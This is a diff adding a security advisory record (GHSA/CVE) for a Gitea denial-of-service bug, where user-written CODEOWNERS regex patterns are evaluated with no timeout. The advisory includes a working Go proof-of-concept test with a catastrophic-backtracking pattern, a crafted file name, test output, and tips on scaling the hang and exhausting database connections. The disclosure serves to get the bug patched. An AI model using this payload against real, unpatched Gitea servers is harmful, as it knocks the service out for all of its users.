@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-v96j-25gv-g2w9",
+  "modified": "2026-07-21T20:45:36.475190146Z",
+  "published": "2026-07-21T20:34:33Z",
+  "aliases": [
+    "CVE-2026-58421"
+  ],
+  "summary": "Gitea: Unauthenticated ReDoS via CODEOWNERS pattern matching allows denial of service",
+  "details": "This issue has been found by a security agent and review by myself.\n\nGitea's CODEOWNERS feature uses the regexp2 library to match file paths against ownership rules. User-supplied patterns are passed directly to regexp2.Compile with no sanitisation and no match timeout. This allows an attacker to write a pattern that causes the regex engine to backtrack exponentially when evaluated against a crafted file path.\n\n### Who can trigger it\n\nAny registered user on the instance. The attacker needs only:\n1. A repository they own (created via normal signup)\n2. A `CODEOWNERS` file on the default branch containing malicious patterns\n3. A pull request branch containing a file with a crafted name\n\nNo elevated permissions, no admin access, no existing repositories required.\n\n### How it is triggered\n\nThe attacker pushes a CODEOWNERS file containing repeated instances of a\ncatastrophic backtracking pattern (e.g. (a+)+ @attacker) and opens a pull request\nfrom a branch that contains a file named with a long string of repeated\ncharacters followed by a non-matching character (e.g.\n`aaaaaaaaaaaaaaaaaaaaaaaaaaX`). When Gitea processes the pull request, it evaluates\neach CODEOWNERS rule against each changed file path — with no timeout — causing\nthe server to hang for the duration of the backtracking.\n\n### Impact\n\nEvery pull request creation runs this evaluation inside a database transaction. A\nhung evaluation holds that transaction open, tying up a database connection for\nthe entire duration. With 11 rules in the CODEOWNERS file, a single pull request\ncreation request takes over 30 seconds. An attacker opening multiple pull\nrequests in parallel can exhaust the database connection pool, making the Gitea\ninstance unresponsive to all users.\n\n### Root cause\n\nThe vulnerable regex is here: \n\nhttps://github.com/go-gitea/gitea/blob/79810ba2e37a5b5b7840a7737a877fc7f1ea7c38/models/issues/pull.go#L886\n\n### PoC\n\nBelow is a PoC that demonstrates that 11 lines in a CODEOWNERS file and a well-named branch can trigger long processing times.\n\nThis is tested at commit `689ace1ce28fd74244b8aa335d9928cdbf6b22f9`.\n\n`tests/integration/pull_redos_test.go`\n```go\npackage integration\n\n// TestCodeOwnersReDoS_NewPullRequest demonstrates the ReDoS vulnerability\n// triggered via the full pull.NewPullRequest call chain.\n//\n// POST /api/v1/repos/{owner}/{repo}/pulls\n//   -\u003e routers/api/v1/repo/pull.go:CreatePullRequest\n//   -\u003e pull.NewPullRequest (services/pull/pull.go)\n//   -\u003e db.WithTx                              \u003c- holds DB connection for duration of hang\n//     -\u003e issues_model.NewPullRequest          \u003c- inserts PR into DB\n//     -\u003e PullRequestCodeOwnersReview          \u003c- evaluates CODEOWNERS\n//       -\u003e rule.Rule.MatchString(changedFile) \u003c- hangs here (catastrophic backtracking)\n//\n// The attacker controls both sides of the match:\n//   - CODEOWNERS pattern: \"(a+)+\" compiled as ^(a+)+$ with regexp2.None (no timeout)\n//   - PR changed file:    \"aaa...X\" forces O(2^N) backtracking states\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"strings\"\n\t\"testing\"\n\t\"time\"\n\n\tauth_model \"gitea.dev/models/auth\"\n\tuser_model \"gitea.dev/models/user\"\n\t\"gitea.dev/models/unittest\"\n\t\"gitea.dev/modules/git\"\n\tapi \"gitea.dev/modules/structs\"\n\trepo_service \"gitea.dev/services/repository\"\n\tfiles_service \"gitea.dev/services/repository/files\"\n\n\t\"github.com/stretchr/testify/assert\"\n\t\"github.com/stretchr/testify/require\"\n)\n\nfunc TestCodeOwnersReDoS_NewPullRequest(t *testing.T) {\n\tonGiteaRun(t, func(t *testing.T, u *url.URL) {\n\t\tuser2 := unittest.AssertExistsAndLoadBean(t, \u0026user_model.User{ID: 2})\n\n\t\trepo, err := repo_service.CreateRepositoryDirectly(t.Context(), user2, user2, repo_service.CreateRepoOptions{\n\t\t\tName:             \"redos-codeowners\",\n\t\t\tReadme:           \"Default\",\n\t\t\tAutoInit:         true,\n\t\t\tObjectFormatName: git.Sha1ObjectFormat.Name(),\n\t\t\tDefaultBranch:    \"main\",\n\t\t}, true)\n\t\trequire.NoError(t, err)\n\n\t\t// Push malicious CODEOWNERS to the default branch.\n\t\t// 11 identical rules × 1 changed file = 11 sequential MatchString calls.\n\t\t// Each call takes ~2.8s (25-char late-failing input), totalling ~30s.\n\t\t// ParseCodeOwnersLine wraps each token as ^(a+)+$ with regexp2.None (no timeout).\n\t\tvar codeowners strings.Builder\n\t\tfor range 11 {\n\t\t\tcodeowners.WriteString(\"(a+)+ @user2\\n\")\n\t\t}\n\t\t_, err = files_service.ChangeRepoFiles(t.Context(), repo, user2, \u0026files_service.ChangeRepoFilesOptions{\n\t\t\tOldBranch: repo.DefaultBranch,\n\t\t\tFiles: []*files_service.ChangeRepoFile{\n\t\t\t\t{\n\t\t\t\t\tOperation:     \"create\",\n\t\t\t\t\tTreePath:      \"CODEOWNERS\",\n\t\t\t\t\tContentReader: strings.NewReader(codeowners.String()),\n\t\t\t\t},\n\t\t\t},\n\t\t})\n\t\trequire.NoError(t, err)\n\n\t\t// Create a PR branch containing a file whose path is a late-failing input\n\t\t// for ^(a+)+$: 'a's that the engine greedily matches, then 'X' forces\n\t\t// backtracking through O(2^N) states (~2.8s per rule at 25 chars).\n\t\tmaliciousFilename := strings.Repeat(\"a\", 25) + \"X\"\n\t\t_, err = files_service.ChangeRepoFiles(t.Context(), repo, user2, \u0026files_service.ChangeRepoFilesOptions{\n\t\t\tNewBranch: \"attack\",\n\t\t\tFiles: []*files_service.ChangeRepoFile{\n\t\t\t\t{\n\t\t\t\t\tOperation:     \"create\",\n\t\t\t\t\tTreePath:      maliciousFilename,\n\t\t\t\t\tContentReader: strings.NewReader(\"x\"),\n\t\t\t\t},\n\t\t\t},\n\t\t})\n\t\trequire.NoError(t, err)\n\n\t\t// Obtain an API token for user2 and submit the PR creation request.\n\t\t// This calls pull.NewPullRequest which runs issues_model.NewPullRequest and\n\t\t// PullRequestCodeOwnersReview inside a single db.WithTx, tying up a DB\n\t\t// connection for the duration of the backtracking hang.\n\t\tsession := loginUser(t, user2.Name)\n\t\ttoken := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopeWriteRepository)\n\n\t\tstart := time.Now()\n\t\treq := NewRequestWithJSON(t, http.MethodPost,\n\t\t\tfmt.Sprintf(\"/api/v1/repos/%s/%s/pulls\", user2.Name, repo.Name),\n\t\t\t\u0026api.CreatePullRequestOption{\n\t\t\t\tTitle: \"ReDoS PoC\",\n\t\t\t\tHead:  \"attack\",\n\t\t\t\tBase:  repo.DefaultBranch,\n\t\t\t},\n\t\t).AddTokenAuth(token)\n\t\tMakeRequest(t, req, http.StatusCreated)\n\t\telapsed := time.Since(start)\n\n\t\tt.Logf(\"pull.NewPullRequest completed in %s\", elapsed)\n\t\tassert.Greater(t, elapsed, 25*time.Second,\n\t\t\t\"expected ~30s ReDoS hang (11 rules × ~2.8s each); pattern may have been sanitised\")\n\t})\n}\n```\n\nNow run:\n\n```\n# 1. Build the binary (needed for git hooks during repo creation)\nmake build\n\n# 2. Run the test\ngo test -v -run '^TestCodeOwnersReDoS_NewPullRequest$' -count=1 -timeout 120s ./tests/integration/\n```\n\nWhen the unit test starts, you should see that it takes 30 seconds with the following output:\n```\n=== TestCodeOwnersReDoS_NewPullRequest (tests/integration/pull_redos_test.go:42)\n    testlogger.go:62: 2026/06/02 14:34:43 modules/storage/local.go:48:NewLocalStorage() [I] Creating new Local Storage at /tmp/gitea-3/tests/gitea-lfs-meta\n    testlogger.go:62: 2026/06/02 14:34:43 HTTPRequest [I] router: completed POST /api/internal/hook/pre-receive/user2/redos-codeowners for 127.0.0.1:0, 200 OK in 4.5ms @ private/hook_pre_receive.go:109(private.HookPreReceive)\n    testlogger.go:62: 2026/06/02 14:34:44 HTTPRequest [I] router: completed POST /api/internal/hook/post-receive/user2/redos-codeowners for 127.0.0.1:0, 200 OK in 80.7ms @ private/hook_post_receive.go:33(private.HookPostReceive)\n    testlogger.go:62: 2026/06/02 14:34:44 HTTPRequest [I] router: completed POST /api/internal/hook/pre-receive/user2/redos-codeowners for 127.0.0.1:0, 200 OK in 3.5ms @ private/hook_pre_receive.go:109(private.HookPreReceive)\n    testlogger.go:62: 2026/06/02 14:34:44 HTTPRequest [I] router: completed POST /api/internal/hook/post-receive/user2/redos-codeowners for 127.0.0.1:0, 200 OK in 60.8ms @ private/hook_post_receive.go:33(private.HookPostReceive)\n    testlogger.go:62: 2026/06/02 14:34:44 HTTPRequest [I] router: completed POST /user/login for test-mock:12345, 303 See Other in 3.1ms @ auth/auth.go:284(auth.SignInPost)\n    testlogger.go:62: 2026/06/02 14:34:44 HTTPRequest [I] router: completed POST /user/settings/applications for test-mock:12345, 303 See Other in 6.1ms @ setting/applications.go:36(setting.ApplicationsPost)\n    testlogger.go:62: 2026/06/02 14:34:47 HTTPRequest [W] router: slow      POST /api/v1/repos/user2/redos-codeowners/pulls for test-mock:12345, elapsed 3182.4ms @ repo/pull.go:371(repo.CreatePullRequest)\n    testlogger.go:62: 2026/06/02 14:35:16 HTTPRequest [I] router: completed POST /api/v1/repos/user2/redos-codeowners/pulls for test-mock:12345, 201 Created in 31631.6ms @ repo/pull.go:371(repo.CreatePullRequest)\n    pull_redos_test.go:109: pull.NewPullRequest completed in 31.63184107s\n+++ TestCodeOwnersReDoS_NewPullRequest is a slow test (run: 33.342443947s, flush: 371.714µs)\n--- PASS: TestCodeOwnersReDoS_NewPullRequest (33.34s)\nPASS\n```\n\nYou can modify the \"11\" number in the CODEOWNERS file to manage execution speed directly: \n```go\n\t\tfor range 11 {\n\t\t\tcodeowners.WriteString(\"(a+)+ @user2\\n\")\n\t\t}\n```\n\nA higher number of lines will increase the execution time.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.26.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.26.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v96j-25gv-g2w9/GHSA-v96j-25gv-g2w9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-v96j-25gv-g2w9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-58421"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38011"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/ea35af1b68d57522c7686618bd61d3216d91589f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://blog.gitea.com/release-of-1.26.3-and-1.26.4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.26.4"
+    }
+  ]
+}
